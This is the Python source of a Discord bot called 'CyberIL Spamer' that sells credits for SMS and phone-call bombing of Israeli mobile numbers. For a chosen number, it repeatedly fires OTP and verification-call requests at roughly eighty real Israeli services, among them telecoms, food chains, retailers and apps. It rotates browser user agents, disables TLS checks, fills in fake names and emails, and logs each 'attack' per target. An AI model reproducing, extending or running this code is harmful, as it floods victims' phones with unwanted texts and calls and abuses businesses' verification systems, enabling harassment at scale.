import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid
import aiohttp
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone
import certifi

TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "CyberIL_Spamer"

PANEL_CHANNEL = 1481957038241353779
GIFT_CHANNEL = 1485104425625325709
INFO_CHANNEL = 1485125569690603692

ADMIN_ROLE_ID = 1480762750052601886
STORE_URL = "https://discord.gg/3CxwPGuGyq"

COOLDOWN_TIME = 20
MAX_CREDIT_SPEND = 100
LAUNCH_DELAY = 3

COLOR_PRIMARY = 0x2B2D31
COLOR_ACCENT = 0x5865F2
COLOR_SUCCESS = 0x23A55A
COLOR_DANGER = 0xDA373C
COLOR_WARNING = 0xFEE75C
COLOR_INFO = 0x1E1F22

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

client = commands.Bot(command_prefix="!", intents=intents)
tree = client.tree

mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
database = mongo_connection[DB_NAME]
users_collection = database["users"]
cooldown_collection = database["cooldowns"]
settings_collection = database["settings"]
logs_collection = database["attack_logs"]

logging.basicConfig(level=logging.WARNING)

active_missions = {}
cooldown_tracker = {}

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15"
]

def random_agent():
    return random.choice(BROWSER_AGENTS)

async def fetch_balance(user_id: int) -> int:
    record = await users_collection.find_one({"_id": user_id})
    if not record:
        return 0
    if record.get("unlimited"):
        return 999999
    return record.get("credits", 0)

async def has_unlimited(user_id: int) -> bool:
    record = await users_collection.find_one({"_id": user_id})
    return bool(record and record.get("unlimited"))

async def format_balance(user_id: int) -> str:
    if await has_unlimited(user_id):
        return "∞"
    return str(await fetch_balance(user_id))

async def add_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": amount}}, upsert=True)

async def remove_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_unlimited(user_id: int, status: bool):
    await users_collection.update_one({"_id": user_id}, {"$set": {"unlimited": status}}, upsert=True)

async def use_credit(user_id: int) -> bool:
    if await has_unlimited(user_id):
        return True
    result = await users_collection.update_one(
        {"_id": user_id, "credits": {"$gte": 1}},
        {"$inc": {"credits": -1}}
    )
    return result.modified_count == 1

async def check_cooldown(target: str):
    record = await cooldown_collection.find_one({"target": target})
    if not record:
        return False, 0
    elapsed = time.time() - record["last_attempt"]
    if elapsed < COOLDOWN_TIME:
        return True, int(COOLDOWN_TIME - elapsed)
    return False, 0

async def apply_cooldown(target: str):
    await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)

def is_admin(interaction: discord.Interaction) -> bool:
    return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]

async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int):
    entry = {
        "user_id": user_id,
        "username": username,
        "phone": phone,
        "cost": cost,
        "success_count": success,
        "failed_count": failed,
        "total": success + failed,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc),
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
    }
    await logs_collection.insert_one(entry)

async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
    headers = {
        "User-Agent": random_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if headers_extra:
        headers.update(headers_extra)
    
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        
        if method == "GET":
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif json_data is not None:
            headers.setdefault("Content-Type", "application/json")
            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif data is not None:
            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        else:
            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
    except:
        return False, tag

async def atmos_request(session, store_id, phone, is_call=False):
    tag = "atmos_call" if is_call else "atmos"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", store_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    h = {
        "User-Agent": random_agent(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "origin": "https://order.atmos.rest",
        "referer": "https://order.atmos.rest/",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        endpoint = "sendValidationCall" if is_call else "sendValidationCode"
        api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}"
        async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            return resp.status < 500, tag
    except:
        return False, tag

async def run_single_batch(phone: str):
    raw = phone
    phone_raw = phone
    phone_intl = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
    sid = str(uuid.uuid4())
    random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        # אטומס - 38 חנויות × 2 (SMS + CALL) = 76 בקשות
        atmos_stores = [
            "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
            "28","29","33","35","48","51","56","57","59",
            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
            "2063","2070","2073","2076","2078","2087","2088","2091",
        ]
        
        tasks = []
        for store in atmos_stores:
            tasks.append(atmos_request(s, store, raw, False))  # SMS
            tasks.append(atmos_request(s, store, raw, True))   # CALL
        
        # אטומס קלאב
        tasks.append(atmos_request(s, "23", raw, False))
        tasks.append(atmos_request(s, "59", raw, False))
        
        geteat_fd = aiohttp.FormData()
        geteat_fd.add_field("restaurant_id", "9")
        geteat_fd.add_field("phone", raw)
        geteat_fd.add_field("testing", "false")
        
        # כל השירותים החדשים
        all_tasks = [
            # Netfree
            send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                json_data={"agreeTou": True, "phone": phone_intl}, tag="netfree"),
            
            # Pelephone OTP
            send_request(s, "https://www.pelephone.co.il/login/api/login/otp-ivr/",
                method="POST", tag="pelephone_ivr"),
            send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
                json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone_otp"),
            
            # Cellcom
            send_request(s, "https://www.cellcom.co.il/api/auth/sms",
                json_data={"phone": raw}, tag="cellcom"),
            
            # Partner
            send_request(s, "https://www.partner.co.il/api/register",
                json_data={"phone": raw}, tag="partner"),
            
            # Hot Mobile
            send_request(s, "https://www.hotmobile.co.il/api/verify",
                json_data={"phone": raw}, tag="hot"),
            
            # Bezeq
            send_request(s, "https://www.bezeq.co.il/api/auth",
                json_data={"phone": raw}, tag="bezeq"),
            
            # Gett
            send_request(s, "https://www.gett.com/il/wp-admin/admin-ajax.php",
                data={
                    "action": "business_reg_action",
                    "phone": phone_intl,
                    "first_name": "cyber",
                    "last_name": "il",
                    "work_email": random_email,
                    "privacy_policy": "true"
                }, tag="gett"),
            
            # Shufersal
            send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp",
                json_data={"phone": raw}, tag="shufersal"),
            
            # Rami Levy
            send_request(s, "https://www.rami-levy.co.il/api/auth/sms",
                json_data={"phone": raw}, tag="ramilevy"),
            
            # Victory
            send_request(s, "https://www.victory.co.il/api/auth/sms",
                json_data={"phone": raw}, tag="victory"),
            
            # 10bis
            send_request(s, "https://www.10bis.co.il/api/register",
                json_data={"phone": raw}, tag="10bis"),
            
            # McDonalds
            send_request(s, "https://www.mcdonalds.co.il/api/verify",
                json_data={"phone": raw}, tag="mcdonalds"),
            
            # Burger King
            send_request(s, "https://www.burgerking.co.il/api/auth",
                json_data={"phone": raw}, tag="burgerking"),
            
            # KFC
            send_request(s, "https://www.kfc.co.il/api/sms",
                json_data={"phone": raw}, tag="kfc"),
            
            # Pizza Hut
            send_request(s, "https://www.pizza-hut.co.il/api/register",
                json_data={"phone": raw}, tag="pizzahut"),
            
            # Dominos
            send_request(s, "https://www.dominos.co.il/api/auth/sms",
                json_data={"phone": raw}, tag="dominos"),
            
            # Burger Anch
            send_request(s, "https://app.burgeranch.co.il/_a/aff_otp_auth",
                form=f"phone={raw}", tag="burgeranch"),
            
            # Pango
            send_request(s, "https://api.pango.co.il/auth/otp",
                json_data={"phoneNumber": raw}, tag="pango"),
            
            # Hopon
            send_request(s, "https://api.hopon.co.il/v0.15/1/isr/users",
                json_data={"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": raw, "phoneCall": False}, tag="hopon"),
            
            # Yad2
            send_request(s, "https://www.yad2.co.il/api/auth/register",
                json_data={"phone": raw, "action": "send_sms"}, tag="yad2"),
            
            # PayBox
            send_request(s, "https://payboxapp.com/api/auth/otp",
                json_data={"phone": raw}, tag="paybox"),
            
            # Super Pharm
            send_request(s, "https://www.super-pharm.co.il/api/sms",
                json_data={"phone": raw}, tag="superpharm"),
            
            # Zap
            send_request(s, "https://www.zap.co.il/api/auth/sms",
                json_data={"phone": raw}, tag="zap"),
            
            # Ivory
            send_request(s, f"https://www.ivory.co.il/user/login/sendCodeSms/{random_email}/{raw}",
                method="GET", tag="ivory"),
            
            # Wolt
            send_request(s, "https://www.wolt.com/api/v1/verify",
                json_data={"phone": raw}, tag="wolt"),
            
            # Femina
            send_request(s, "https://femina.co.il/apps/feminaapp/auth/send-code",
                json_data={"phone": raw}, tag="femina"),
            
            # Zygo
            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
                json_data={"phone": raw, "channel": "sms"}, tag="zygo"),
            
            # CityCar
            send_request(s, "https://proxy1.citycar.co.il/api/verify/login",
                json_data={"phoneNumber": phone_intl, "verifyChannel": 0, "loginOrRegister": 2}, tag="citycar"),
            
            # Trusty
            send_request(s, "https://trusty.co.il/api/auth/ask-for-auth-code",
                json_data={"email": "", "phone": raw, "process_name": "normal_login", "provider_api_key": "q4IcUNl"}, tag="trusty"),
            
            # Tami4
            send_request(s, "https://www.tami4.co.il/api/login/start-sms-otp",
                json_data={"phoneNumber": raw, "cookieToken": str(int(time.time()*1000)) + "gciuvn5pcvhnext13", "isMobile": False}, tag="tami4"),
            
            # Zinger Organic
            send_request(s, "https://www.zinger-organic.com/frontend/chkkksoepvnbnbb",
                form=f"phone_number={raw}&_token=UvDFsX8fy3p35K3mVrXRCBJzrgjHWvYZAyMrnNnT&login_message_type=sms", tag="zinger"),
            
            # Delta
            send_request(s, "https://www.delta.co.il/customer/ajax/post/",
                form=f"form_key=abc123&bot_validation=1&type=login&telephone={raw}", tag="delta"),
            
            # Adika Style
            send_request(s, "https://www.adikastyle.com/customer/ajax/post/",
                form=f"form_key=xyz789&bot_validation=1&type=login&telephone={raw}", tag="adika"),
            
            # Weshoes
            send_request(s, "https://www.weshoes.co.il/customer/ajax/post/",
                form=f"form_key=def456&bot_validation=1&type=login&telephone={raw}", tag="weshoes"),
            
            # Fix Underwear
            send_request(s, "https://www.fixunderwear.com/customer/ajax/post/",
                form=f"form_key=ghi789&bot_validation=1&type=login&telephone={raw}", tag="fix"),
            
            # Kiwi Kids
            send_request(s, "https://www.kiwi-kids.co.il/customer/ajax/post/",
                form=f"form_key=jkl012&bot_validation=1&type=login&telephone={raw}", tag="kiwi"),
            
            # Nautica
            send_request(s, "https://www.nautica.co.il/customer/ajax/post/",
                form=f"form_key=mno345&bot_validation=1&type=login&telephone={raw}", tag="nautica"),
            
            # Yves Rocher
            send_request(s, "https://www.yvesrocher.co.il/customer/ajax/post/",
                form=f"form_key=pqr678&bot_validation=1&type=login&telephone={raw}", tag="yvesrocher"),
            
            # Victoria's Secret
            send_request(s, "https://www.victoriassecret.co.il/customer/ajax/post/",
                form=f"form_key=stu901&bot_validation=1&type=login&telephone={raw}", tag="victoria"),
            
            # Golf & Co
            send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
                form=f"form_key=XEWGYBBTMOFgpPkO&bot_validation=1&type=login&telephone={raw}", tag="golfco"),
            
            # 019
            send_request(s, "https://019sms.co.il/api/register",
                json_data={"phone": raw}, tag="019"),
            
            # Care Glasses
            send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php",
                data={
                    "action": "elementor_pro_forms_send_form",
                    "post_id": "351178",
                    "form_id": "7079d8dd",
                    "form_fields[name]": "CyberIL",
                    "form_fields[phone]": raw,
                    "form_fields[email]": random_email,
                    "form_fields[accept]": "on"
                }, tag="care"),
            
            # Jungle Club
            send_request(s, "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungle"),
            
            # Blendo
            send_request(s, "https://blendo.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="blendo"),
            
            # Mishloha
            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": sid}, tag="mishloha"),
            
            # FreeTV
            send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms",
                json_data={"msisdn": phone_intl}, tag="freetv"),
            
            # Webcut
            send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
                json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
            
            # FreeIVR
            send_request(s, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone",
                json_data={"phone": f"972{raw[1:]}"}, tag="freeivr"),
            
            # Mitmachim
            send_request(s, "https://mitmachim.top/api/v3/plugins/MitMValidPhone",
                json_data={"action": "Send", "phone": raw}, tag="mitmachim"),
            
            # Go Mobile
            send_request(s, "https://api.gomobile.co.il/api/login",
                json_data={"phone": raw}, tag="gomobile"),
            
            # Bonita de Mas
            send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
                json_data={"action": "login", "otpBy": "sms", "otpValue": raw}, tag="bonita"),
            
            # Crazy Line
            send_request(s, "https://www.crazyline.com/customer/ajax/post/",
                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}", tag="crazy"),
            
            # Fox
            send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw, "uuid": "498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}, tag="fox"),
            
            # Fox Home
            send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw, "uuid": "6db5a63b-6882-414f-a090-de263dd917d7"}, tag="foxhome"),
            
            # Laline
            send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw, "uuid": "ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}, tag="laline"),
            
            # Footlocker
            send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw, "uuid": "9961459f-9f83-4aab-9cee-58b1f6793547"}, tag="footlocker"),
            
            # Hamal
            send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
                json_data={"value": raw, "type": "phone", "projectId": "1"}, tag="hamal"),
            
            # Intima
            send_request(s, "https://www.intima-il.co.il/customer/ajax/post/",
                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="intima"),
            
            # Steimatzky
            send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/",
                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="steimatzky"),
            
            # Globes
            send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                form=f"value={raw}&value_type=", tag="globes"),
            
            # Moraz
            send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                form=f"action=validate_user_by_sms&phone={raw}", tag="moraz"),
            
            # Arcaffe
            send_request(s, "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                form=f"action=user_login_step_1&phone_number={raw}&step[]=1", tag="arcaffe"),
            
            # Geteat
            send_request(s, "https://api.geteat.co.il/auth/sendValidationCode",
                data=geteat_fd, tag="geteat"),
            
            # Histadrut
            send_request(s, "https://api-endpoints.histadrut.org.il/signup/send_code",
                json_data={"phone": raw}, tag="histadrut"),
            
            # Papajohns
            send_request(s, "https://www.papajohns.co.il/_a/aff_otp_auth",
                form=f"phone={raw}", tag="papajohns"),
            
            # Iburgerim
            send_request(s, "https://www.iburgerim.co.il/_a/aff_otp_auth",
                form=f"phone={raw}", tag="iburgerim"),
            
            # American Laser
            send_request(s, f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
                method="GET", tag="americanlaser"),
            
            # Xtra
            send_request(s, "https://xtra.co.il/apps/api/inforu/sms",
                json_data={"phoneNumber": raw}, tag="xtra"),
            
            # Myofer
            send_request(s, "https://server.myofer.co.il/api/sendAuthSms",
                json_data={"phoneNumber": raw}, tag="myofer"),
            
            # Noy Hasade
            send_request(s, "https://api.noyhasade.co.il/api/login?origin=web",
                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"}, tag="noyhasade"),
            
            # Call2All
            send_request(s, "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
                data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"}, tag="call2all"),
            
            # Dibs
            send_request(s, "https://rest-api.dibs-app.com/otps",
                json_data={"phoneNumber": phone_intl}, tag="dibs"),
        ]
        
        all_tasks.extend(tasks)
        
        all_res = await asyncio.gather(*all_tasks, return_exceptions=True)
        success = 0
        
        for r in all_res:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, tuple):
                ok, name = r
                if ok:
                    success += 1
        
        return success

def create_panel():
    embed = discord.Embed(
        title="",
        description="",
        color=COLOR_ACCENT
    )
    embed.set_author(name="CYBERIL SPAMER")
    embed.add_field(name="╭───────────────╮", value="", inline=False)
    embed.add_field(name="│  🚀 START", value="│  לחץ על הכפתור למטה", inline=False)
    embed.add_field(name="│  💎 CREDITS", value=f"│  כל קרדיט = דקה אחת", inline=False)
    embed.add_field(name="│  ⏱️ COOLDOWN", value=f"│  {COOLDOWN_TIME} שניות", inline=False)
    embed.add_field(name="│  📊 STATUS", value="│  מערכת פעילה", inline=False)
    embed.add_field(name="╰───────────────╯", value="", inline=False)
    embed.set_footer(text=f"© CYBERIL • {datetime.now().strftime('%d/%m/%Y')}")
    return embed

def create_gift_panel():
    embed = discord.Embed(title="", description="", color=0xFFD700)
    embed.set_author(name="FREE CREDITS")
    embed.add_field(name="╭───────────────╮", value="", inline=False)
    embed.add_field(name="│  🎁 CLAIM", value="│  קרדיט אחד כל 24 שעות", inline=False)
    embed.add_field(name="│  💎 REWARD", value="│  +1 קרדיט", inline=False)
    embed.add_field(name="╰───────────────╯", value="", inline=False)
    embed.set_footer(text=f"© CYBERIL • {datetime.now().strftime('%d/%m/%Y')}")
    return embed

class StopAttack(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="⏹️ עצור", style=discord.ButtonStyle.danger)
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id and not is_admin(interaction):
            await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
            return
        ev = active_missions.get(self.user_id)
        if ev:
            ev.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmAttack(discord.ui.View):
    def __init__(self, phone: str, cost: int, user_id: int):
        super().__init__(timeout=30)
        self.phone = phone
        self.cost = cost
        self.user_id = user_id
        self.is_running = False

    @discord.ui.button(label="✅ אישור", style=discord.ButtonStyle.success)
    async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
            return
        
        if self.is_running:
            await interaction.response.send_message("⚠️ הספאם כבר בתהליך", ephemeral=True)
            return
        
        self.is_running = True
        await interaction.response.defer(ephemeral=True)
        
        for _ in range(self.cost):
            if not await use_credit(self.user_id):
                embed = discord.Embed(title="❌ שגיאה", description="אין מספיק קרדיטים", color=COLOR_DANGER)
                await interaction.edit_original_response(embed=embed, view=None)
                return

        event = asyncio.Event()
        active_missions[self.user_id] = event

        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"**יעד:** {self.phone}\n**זמן:** {self.cost} דקות", color=COLOR_WARNING)
        await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))

        total_success = 0
        start_time = time.time()
        end_time = start_time + (self.cost * 60)
        last_update = time.time()

        try:
            while time.time() < end_time:
                if event.is_set():
                    break
                
                success = await run_single_batch(self.phone)
                total_success += success
                
                if time.time() - last_update >= 3:
                    remaining = max(0, int((end_time - time.time()) / 60))
                    embed = discord.Embed(
                        title="🔄 ספאם בתהליך",
                        description=f"**יעד:** {self.phone}\n**נותר:** {remaining} דקות\n\n**✅ בקשות שנשלחו:** {total_success}",
                        color=COLOR_WARNING
                    )
                    await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                    last_update = time.time()

            await apply_cooldown(self.phone)
            active_missions.pop(self.user_id, None)
            stopped = event.is_set()

            await save_log(
                user_id=self.user_id,
                username=str(interaction.user),
                phone=self.phone,
                cost=self.cost,
                success=total_success,
                failed=0,
                duration=self.cost * 60
            )

            bal = await format_balance(self.user_id)
            
            if stopped:
                embed = discord.Embed(title="⏹️ ספאם הופסק", color=COLOR_WARNING)
            else:
                embed = discord.Embed(title="✅ ספאם הושלם", color=COLOR_SUCCESS)
            
            embed.add_field(name="📱 יעד", value=self.phone, inline=True)
            embed.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
            embed.add_field(name="💎 קרדיטים", value=bal, inline=True)
            embed.add_field(name="📨 בקשות", value=str(total_success), inline=True)
            
            await interaction.edit_original_response(embed=embed, view=None)

        except Exception as e:
            active_missions.pop(self.user_id, None)
            embed = discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=COLOR_DANGER)
            await interaction.edit_original_response(embed=embed, view=None)

    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary)
    async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא שלך", ephemeral=True)
            return
        self.stop()
        embed = discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים", color=COLOR_INFO)
        await interaction.response.edit_message(embed=embed, view=None)

class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="0501234567", min_length=10, max_length=10)
    credits = discord.ui.TextInput(label="כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3)

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value.strip()
        if not re.match(r"^05[0-9]{8}$", phone_num):
            embed = discord.Embed(title="❌ שגיאה", description="מספר לא תקין", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        try:
            credits_num = int(self.credits.value.strip())
            if credits_num < 1 or credits_num > MAX_CREDIT_SPEND:
                raise ValueError
        except ValueError:
            embed = discord.Embed(title="❌ שגיאה", description="כמות לא תקינה", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        uid = interaction.user.id
        bal = await fetch_balance(uid)
        unlimited = await has_unlimited(uid)

        if bal < credits_num and not unlimited:
            embed = discord.Embed(title="❌ שגיאה", description="חסרים קרדיטים", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        on_cd, remain = await check_cooldown(phone_num)
        if on_cd:
            embed = discord.Embed(title="⏱️ דיליי", description=f"המתן {remain} שניות", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        bal_str = await format_balance(uid)
        embed = discord.Embed(
            title="⚠️ אישור ספאם",
            description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}",
            color=COLOR_WARNING
        )
        
        try:
            await interaction.response.send_message(embed=embed, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
        except discord.errors.NotFound:
            await interaction.followup.send(embed=embed, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger, emoji="🚀")
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        now = time.time()
        last = cooldown_tracker.get(interaction.user.id, 0)
        if now - last < LAUNCH_DELAY:
            rem = int(LAUNCH_DELAY - (now - last))
            embed = discord.Embed(title="⏱️ דיליי", description=f"המתן {rem} שניות", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        cooldown_tracker[interaction.user.id] = now
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="💎 קרדיטים", style=discord.ButtonStyle.primary, emoji="💎")
    async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        bal_str = await format_balance(uid)
        stats = await get_user_stats(uid)

        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"**{bal_str}**", color=COLOR_ACCENT)
        if stats:
            embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
            embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊")
    async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        stats = await get_global_stats()
        
        if not stats:
            embed = discord.Embed(title="📊 סטטיסטיקה", description="אין נתונים", color=COLOR_INFO)
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_ACCENT)
        embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
        embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
        embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)

class FreeCoins(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל", style=discord.ButtonStyle.success, emoji="🎁")
    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        await interaction.response.defer(ephemeral=True)

        doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
        if doc:
            diff = now - doc.get("last_claim", 0)
            if diff < 86400:
                hours = int((86400 - diff) // 3600)
                minutes = int(((86400 - diff) % 3600) // 60)
                embed = discord.Embed(title="⏱️ קרדיטים חינם", description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות", color=COLOR_WARNING)
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

        await add_credits(uid, 1)
        await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
        new_bal = await format_balance(uid)
        
        embed = discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\n**יתרה:** {new_bal}", color=0xFFD700)
        await interaction.followup.send(embed=embed, ephemeral=True)

async def get_user_stats(user_id: int):
    pipeline = [
        {"$match": {"user_id": user_id}},
        {"$group": {
            "_id": "$user_id",
            "total_attacks": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    return result[0] if result else None

async def get_global_stats():
    pipeline = [
        {"$group": {
            "_id": None,
            "total_attacks": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
            "unique_users": {"$addToSet": "$user_id"}
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    if result:
        result[0]["unique_users"] = len(result[0]["unique_users"])
        return result[0]
    return None

async def get_user_logs(user_id: int, limit: int = 20):
    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_all_logs(limit: int = 100):
    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

